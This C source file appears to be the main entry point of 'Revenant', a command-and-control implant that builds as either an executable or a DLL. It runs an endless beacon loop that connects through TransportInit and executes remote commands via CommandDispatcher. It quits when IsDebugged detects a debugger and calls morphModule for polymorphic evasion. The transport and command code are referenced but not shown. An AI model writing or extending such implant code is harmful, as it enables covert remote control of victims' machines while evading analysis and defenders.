#pragma clang diagnostic push
#pragma ide diagnostic ignored "EndlessLoop"

#include "Core.h"
#include "Poly.h"
#include "Command.h"
#include "Revenant.h"
#include "AntiDebug.h"
#include "Transport.h"

INSTANCE Instance = { 0 };

#if CONFIG_MAKE == 0
INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd ) {
    $$$
    RvntInit();

    do {
        if(IsDebugged()){
            return;
        }

        if (!Instance.Session.Connected) {
            if(TransportInit()) {
                CommandDispatcher();
            }

        }

        Sleep( Instance.Config.Sleeping * 1000 );

    } while ( TRUE );
}

#elif CONFIG_MAKE == 1
__declspec(dllexport) VOID run();

BOOL APIENTRY DllMain(HINSTANCE hinstDLL,  DWORD  ul_reason_for_call, LPVOID lpReserved){
    morphModule(hinstDLL);
    $$$
    switch (ul_reason_for_call){

        case DLL_PROCESS_ATTACH:

            RvntInit();

            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) run, NULL, 0, NULL);

        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }

    return TRUE;
}

__declspec(dllexport) VOID run(){

    do {
        if(IsDebugged()){
            return;
        }
        if (!Instance.Session.Connected) {

            if (TransportInit()) {

                CommandDispatcher();
            }
        }

        Sleep(Instance.Config.Sleeping * 1000);

    } while (TRUE);
}
#endif


#pragma clang diagnostic pop